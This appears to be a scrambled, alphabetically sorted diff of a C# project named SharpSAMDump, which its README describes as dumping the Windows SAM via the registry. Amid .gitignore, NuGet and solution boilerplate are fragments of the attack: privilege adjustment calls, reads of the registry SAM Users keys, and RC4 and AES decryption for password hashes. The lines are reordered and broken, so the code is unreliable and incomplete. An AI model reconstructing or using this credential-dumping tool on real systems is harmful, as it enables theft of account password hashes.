+"  <Target Name=""EnsureNuGetPackageBuildImports"" BeforeTargets=""PrepareForBuild"">"
+"  <package id=""Microsoft.Windows.CsWin32"" version=""0.3.106"" targetFramework=""net472"" developmentDependency=""true"" />"
+"  <package id=""Microsoft.Windows.SDK.Win32Docs"" version=""0.1.42-alpha"" targetFramework=""net472"" />"
+"  <package id=""Microsoft.Windows.SDK.Win32Metadata"" version=""60.0.34-preview"" targetFramework=""net472"" />"
+"  <package id=""Microsoft.Windows.WDK.Win32Metadata"" version=""0.11.4-experimental"" targetFramework=""net472"" />"
+"  <package id=""System.Buffers"" version=""4.5.1"" targetFramework=""net472"" />"
+"  <package id=""System.Memory"" version=""4.5.5"" targetFramework=""net472"" />"
+"  <package id=""System.Numerics.Vectors"" version=""4.5.0"" targetFramework=""net472"" />"
+"  <package id=""System.Runtime.CompilerServices.Unsafe"" version=""6.0.0"" targetFramework=""net472"" />"
+" Coverlet is a free, cross platform Code Coverage Tool"
+" Ignore Visual Studio temporary files, build results, and"
+" Note: Comment the next line if you want to checkin your web deploy settings,"
+" Since there are multiple workflows, uncomment next line to ignore bower_components"
+" TOKEN_PRIVILEGES_ATTRIBUTES.SE_PRIVILEGE_ENABLED : 0,"
+" checkin your Azure Web App publish settings, but sensitive information contained"
+" ciphertext.Length, hashData, 0, hashData.Length)"
+" except build/, which is used as an MSBuild target."
+" iv.Length, ciphertext, 0, ciphertext.Length)"
+" to a newer Visual Studio version. Backup files are not needed,"
+"""[val "
+".""[val "
+"// COM, set the ComVisible attribute to true on that type."
+"// [assembly: AssemblyVersion(""1.0."
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"Account""))"
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"MessagePack.Annotations.dll"" />"
+"MessagePack.dll"" />"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.Bcl.AsyncInterfaces.dll"" />"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"Microsoft.Windows.CsWin32.dll"" />"
+"Microsoft.Windows.CsWin32.props"" Condition=""Exists('packages"
+"Microsoft.Windows.CsWin32.props')"" />"
+"Microsoft.Windows.CsWin32.props')"" Text=""$([System.String]::Format('$(ErrorText)', 'packages"
+"Microsoft.Windows.CsWin32.props'))"" />"
+"Microsoft.Windows.SDK.Win32Docs.dll"" />"
+"Microsoft.Windows.SDK.Win32Metadata.props"" Condition=""Exists('packages"
+"Microsoft.Windows.SDK.Win32Metadata.props')"" />"
+"Microsoft.Windows.SDK.Win32Metadata.props')"" Text=""$([System.String]::Format('$(ErrorText)', 'packages"
+"Microsoft.Windows.SDK.Win32Metadata.props'))"" />"
+"Microsoft.Windows.WDK.Win32Metadata.props"" Condition=""Exists('packages"
+"Microsoft.Windows.WDK.Win32Metadata.props')"" />"
+"Microsoft.Windows.WDK.Win32Metadata.props')"" Text=""$([System.String]::Format('$(ErrorText)', 'packages"
+"Microsoft.Windows.WDK.Win32Metadata.props'))"" />"
+"Most of the code has been directly ported from James Forshaw's awesome book ""Windows Security Internals: A Deep Dive into Windows Authentication, Authorization, and Auditing"", chapter 10, listings 10.21 to 10.34."
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""SharpSAMDump"", ""SharpSAMDump.csproj"", ""{4FEAB888-F514-4F2E-A4F7-5989A86A69DE}"""
+"System.Text.Encodings.Web.dll"" />"
+"System.Text.Json.dll"" />"
+"Users""))"
+"You can find James' PowerShell code in the [GitHub Repository tyranid/windows-security-internals](https://github.com/tyranid/windows-security-internals/blob/main/chapter_10/listing_10_21_to_10_34.ps1), where it has been published under the Apache 2.0 License."
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""SharpSAMDump"")]"
+"[assembly: AssemblyTitle(""SharpSAMDump"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""4feab888-f514-4f2e-a4f7-5989a86a69de"")]"
+"bufferSize, null, null, null, null, null, null, null, null)"
+"kind,"
+"tokenPrivileges, 0, null, null))"
+"xml version=""1.0"" encoding=""utf-8"""
+"{name}""))"
+"{rid:X8}""))"
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$tf/
+' as shown below:
+()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(
+) with the next byte in the data to
+- [Bb]ackup ([0-9]).rdl
+- [Bb]ackup ([0-9][0-9]).rdl
+- [Bb]ackup.rdl
+.DesktopClient/GeneratedArtifacts
+.DesktopClient/ModelManifest.xml
+.DotSettings.user
+.GhostDoc.xml
+.HTMLClient/GeneratedArtifacts
+.HxC
+.HxT
+.Server/GeneratedArtifacts
+.Server/ModelManifest.xml
+.VC.VC.opendb
+.VC.db
+.VisualState.xml
+.XML
+.[Cc]ache
+.[Cc]ache/
+.[Pp]ublish.xml
+.[Rr]e[Ss]harper
+.appx
+.appxbundle
+.appxupload
+.aps
+.axoCover/
+.azurePubxml
+.bim.layout
+.bim_
+.binlog
+.btm.cs
+.btp.cs
+.build.csdef
+.builds
+.cab
+.cachefile
+.code-workspace
+.coverage
+.coveragexml
+.cr/personal
+.dbmdl
+.dbproj.schemaview
+.dotCover
+.dsp
+.dsw
+.e2e
+.fake/
+.gpState
+.hhc
+.hhk
+.hhp
+.history/
+.htm
+.ilk
+.info
+.iobj
+.ionide/
+.ipdb
+.jfm
+.jmconfig
+.json
+.ldf
+.local.xml
+.localhistory/
+.log
+.mdf
+.meta
+.mfractor/
+.mm.
+.msi
+.msix
+.msm
+.msp
+.ncb
+.ndf
+.ntvs_analysis.dat
+.nuget.props
+.nuget.targets
+.nupkg
+.nvuser
+.obj
+.odx.cs
+.opendb
+.opensdf
+.opt
+.paket/paket.exe
+.pch
+.pdb
+.pfx
+.pgc
+.pgd
+.pidb
+.plg
+.psess
+.publishproj
+.publishsettings
+.pubxml
+.pyc
+.rdl.data
+.rptproj.bak
+.rptproj.rsuser
+.rsp
+.rsuser
+.sap
+.sass-cache/
+.sbr
+.scc
+.sdf
+.settings
+.sln.docstates
+.sln.iml
+.snk
+.snupkg
+.suo
+.svclog
+.tlb
+.tlh
+.tli
+.tlog
+.tmp
+.tmp_proj
+.tss
+.user
+.userosscache
+.userprefs
+.vbp
+.vbw
+.vs/
+.vscode/
+.vshistory/
+.vsp
+.vspscc
+.vspx
+.vssscc
+.xml
+.xsd.cs
+/.NET.
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+// General Information about an assembly is controlled through the following
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// Version information for an assembly consists of the following four values:
+// You can specify all the values or you can default the Build and Revision Numbers
+// associated with an assembly.
+// by using the '
+// credits to: Christopher Whitley (github.com/manbeardgames)
+// from: https://github.com/manbeardgames/RC4
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+/[Pp]ackages/
+/[Pp]ackages/build/
+/[Pp]ackages/repositories.config
+</OutputPath>
+</Project>
+</configuration>
+</packages>
+<configuration>
+<packages>
+= array.Length
+= b >> 1
+= b >> 2
+= b >> 4
+= bytesPerLine)
+= key.GetClassName()
+ASALocalRun/
+Account
+AdjustTokenPrivileges
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+AppPackages/
+AutoTest.Net/
+Backup
+BenchmarkDotNet.Artifacts/
+BundleArtifacts/
+ClientBin/
+Control
+CurrentControlSet
+Debug
+DocProject/Help/
+DocProject/Help/Html2
+DocProject/Help/html
+DocProject/buildhelp/
+Domains
+EndGlobal
+EndGlobalSection
+EndProject
+FakesAssemblies/
+FodyWeavers.xsd
+Generated
+Generated_Code/
+GetCurrentProcess
+GetTokenInformation
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HKEY_LOCAL_MACHINE
+HideSolutionNode = FALSE
+LinkID=322105. The missing file is {0}.</ErrorText>
+LookupPrivilegeName
+LookupPrivilegeValue
+Microsoft.Windows.CsWin32.0.3.106
+Microsoft.Windows.SDK.Win32Docs.0.1.42-alpha
+Microsoft.Windows.SDK.Win32Docs.dll</HintPath>
+Microsoft.Windows.SDK.Win32Metadata.60.0.34-preview
+Microsoft.Windows.WDK.Win32Metadata.0.11.4-experimental
+MigrationBackup/
+MinimumVisualStudioVersion = 10.0.40219.1
+OpenCover/
+OpenProcessToken
+Package.StoreAssociation.xml
+PublishScripts/
+REG_OPEN_CREATE_OPTIONS
+RegOpenKeyEx
+RegQueryInfoKey 
+RegQueryValueEx
+Release
+ScaffoldingReadMe.txt
+ServiceFabricBackup/
+SolutionGuid = {93CEFE08-640E-4FD5-8FCC-30D27E174F02}
+StyleCopReport.xml
+System.Buffers.4.5.1
+System.Buffers.dll</HintPath>
+System.Memory.4.5.5
+System.Memory.dll</HintPath>
+System.Numerics.Vectors.4.5.0
+System.Numerics.Vectors.dll</HintPath>
+System.Runtime.CompilerServices.Unsafe.6.0.0
+System.Runtime.CompilerServices.Unsafe.dll</HintPath>
+TRACE</DefineConstants>
+TestResult.xml
+This project implements SAM dumping via the registry in C
+UpgradeLog
+Users
+VisualStudioVersion = 17.9.34714.143
+WIN32_ERROR
+[Aa][Rr][Mm]/
+[Aa][Rr][Mm]64/
+[Bb]in/
+[Bb]uild[Ll]og.
+[Dd]ebug/
+[Dd]ebugPS/
+[Dd]ebugPublic/
+[Ee]xpress/
+[Ll]og/
+[Ll]ogs/
+[Oo]bj/
+[Rr]elease/
+[Rr]eleasePS/
+[Rr]eleases/
+[Tt]est[Rr]esult
+[Ww][Ii][Nn]32/
+[assembly: ComVisible(false)]
+_Chutzpah
+_NCrunch_
+_Pvt_Extensions
+_ReSharper
+_TeamCity
+_UpgradeReport_Files/
+__pycache__/
+_h.h
+_i.c
+_p.c
+_pkginfo.txt
+_wpftmp.csproj
+analyzers
+artifacts/
+bld/
+bower_components/
+build
+coverage
+crunch
+csx/
+data[0])
+dlldata.c
+ecf/
+else
+endif
+healthchecksdb
+if DEBUG
+ipch/
+issue-259490424)
+issuecomment-104372622)
+mono_crash.
+nCrunchTemp_
+namespace RC4Cryptography
+namespace SharpSAMDump
+net20
+net46
+net461
+netstandard2.0
+node_modules/
+nunit-
+orleans.codegen.cs
+paket-files/
+project.fragment.lock.json
+project.lock.json
+publish/
+rcf/
+using Microsoft.Win32
+using Microsoft.Win32.SafeHandles
+using System
+using System.Collections.Generic
+using System.ComponentModel
+using System.Diagnostics
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Runtime.InteropServices.WindowsRuntime
+using System.Security.Cryptography
+using System.Text
+using Windows.Win32
+using Windows.Win32.Foundation
+using Windows.Win32.Security
+using Windows.Win32.System.Registry
+wwwroot/
+x64/
+x86/
+{4FEAB888-F514-4F2E-A4F7-5989A86A69DE}.Debug
+{4FEAB888-F514-4F2E-A4F7-5989A86A69DE}.Release
